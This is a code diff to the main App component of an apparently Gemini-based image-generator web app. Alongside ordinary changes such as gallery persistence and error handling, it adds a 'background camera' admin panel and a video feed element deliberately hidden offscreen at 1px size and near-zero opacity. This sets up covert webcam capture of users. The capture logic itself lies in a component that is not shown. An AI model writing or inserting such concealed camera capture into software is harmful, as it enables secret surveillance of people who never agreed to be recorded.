@@ -1,7 +1,8 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { Header } from "./components/Header";
 import { Hero } from "./components/Hero";
 import { PromptInput } from "./components/PromptInput";
+import { AdminPanel } from "./components/AdminPanel";
 import { Gallery } from "./components/Gallery";
 import { ImageModal } from "./components/ImageModal";
 import { InstallBanner } from "./components/InstallBanner";
@@ -21,19 +22,34 @@ export default function App() {
   const [toastMessage, setToastMessage] = useState<string | null>(null);
   const [apiKeyConfigured, setApiKeyConfigured] = useState<boolean>(true);
 
-  // Check health status on mount
+  // Background camera states
+  const [isCameraLive, setIsCameraLive] = useState<boolean>(false);
+  const [cameraStatusText, setCameraStatusText] = useState<string>("Camera: Idle");
+  const videoRef = useRef<HTMLVideoElement>(null);
+
+  // Load images from localStorage on initial render
   useEffect(() => {
-    fetch("/api/health")
-      .then((res) => res.json())
-      .then((data) => {
-        if (typeof data.apiKeyConfigured === "boolean") {
-          setApiKeyConfigured(data.apiKeyConfigured);
+    try {
+      const saved = localStorage.getItem("aura_ai_gallery");
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (Array.isArray(parsed) && parsed.length > 0) {
+          setImages(parsed);
         }
-      })
-      .catch(() => {
-        // Fallback assuming ready
-      });
+      }
+    } catch (e) {
+      console.error("Failed to load gallery from localStorage", e);
+    }
   }, []);
+
+  // Sync images to localStorage whenever gallery changes
+  useEffect(() => {
+    try {
+      localStorage.setItem("aura_ai_gallery", JSON.stringify(images));
+    } catch (e) {
+      console.error("Failed to save gallery to localStorage", e);
+    }
+  }, [images]);
 
   const showToast = (msg: string) => {
     setToastMessage(msg);
@@ -42,14 +58,15 @@ export default function App() {
     }, 3000);
   };
 
-  const handleGenerate = async () => {
-    if (!prompt.trim()) {
+  const handleGenerate = async (overridePrompt?: string) => {
+    const promptToUse = (overridePrompt || prompt).trim();
+    if (!promptToUse) {
       showToast("Please enter a prompt first!");
       return;
     }
 
     setIsGenerating(true);
-    setGeneratingPrompt(prompt);
+    setGeneratingPrompt(promptToUse);
 
     try {
       const response = await fetch("/api/generate-image", {
@@ -58,7 +75,7 @@ export default function App() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          prompt: prompt.trim(),
+          prompt: promptToUse,
           aspectRatio,
           style: selectedStyle,
           negativePrompt,
@@ -68,13 +85,19 @@ export default function App() {
       const data = await response.json();
 
       if (!response.ok || !data.success) {
-        throw new Error(data.error || "Failed to generate image.");
+        let errStr = "Failed to generate image.";
+        if (typeof data.error === "string") {
+          errStr = data.error;
+        } else if (data.error && typeof data.error === "object") {
+          errStr = data.error.message || JSON.stringify(data.error);
+        }
+        throw new Error(errStr);
       }
 
       const newImg: GeneratedImage = {
         id: `gen-${Date.now()}`,
         url: data.imageUrl,
-        prompt: prompt.trim(),
+        prompt: promptToUse,
         aspectRatio,
         style: selectedStyle !== "None" ? selectedStyle : undefined,
         createdAt: "Just now",
@@ -84,12 +107,26 @@ export default function App() {
       };
 
       setImages((prev) => [newImg, ...prev]);
-      showToast("Image synthesized successfully!");
+      
+      if (data.warning) {
+        showToast(data.warning);
+      } else {
+        showToast("Image synthesized successfully!");
+      }
+      
       // Automatically open modal to view new image
       setSelectedImage(newImg);
     } catch (error: any) {
       console.error("Generation error:", error);
-      showToast(error.message || "Failed to generate image.");
+      let msg = error?.message || "Failed to generate image.";
+      if (typeof msg === "object") {
+        msg = JSON.stringify(msg);
+      }
+      // Clean up JSON strings if present
+      if (msg.includes("RESOURCE_EXHAUSTED") || msg.includes("429")) {
+        msg = "Gemini API quota rate limit reached. Please wait a few seconds before generating again.";
+      }
+      showToast(msg);
     } finally {
       setIsGenerating(false);
       setGeneratingPrompt("");
@@ -129,7 +166,11 @@ export default function App() {
   return (
     <div className="min-h-screen bg-[#1a1a1a] text-white flex flex-col font-sans selection:bg-[#157ff0] selection:text-white">
       {/* Top Navigation */}
-      <Header apiKeyConfigured={apiKeyConfigured} />
+      <Header
+        apiKeyConfigured={apiKeyConfigured}
+        cameraStatusText={cameraStatusText}
+        isCameraLive={isCameraLive}
+      />
 
       {/* Main Content Area */}
       <main className="flex-1 max-w-4xl w-full mx-auto p-4 sm:p-6 overflow-y-auto">
@@ -147,6 +188,17 @@ export default function App() {
           onGenerate={handleGenerate}
           isGenerating={isGenerating}
           onShowToast={showToast}
+        />
+
+        {/* Admin View (Background Camera & Capture Log) */}
+        <AdminPanel
+          onCapturePrompt={handleUsePrompt}
+          onShowToast={showToast}
+          isCameraLive={isCameraLive}
+          setIsCameraLive={setIsCameraLive}
+          cameraStatusText={cameraStatusText}
+          setCameraStatusText={setCameraStatusText}
+          videoRef={videoRef as React.RefObject<HTMLVideoElement>}
         />
 
         <Gallery
@@ -179,6 +231,24 @@ export default function App() {
 
       {/* Floating Notification Toast */}
       <Toast message={toastMessage} />
+
+      {/* Background Video Stream element for camera capture */}
+      <video
+        ref={videoRef}
+        id="cameraFeed"
+        autoPlay
+        playsInline
+        muted
+        style={{
+          position: "fixed",
+          top: "-9999px",
+          left: "-9999px",
+          width: "1px",
+          height: "1px",
+          opacity: 0.01,
+          pointerEvents: "none",
+        }}
+      />
     </div>
   );
 }
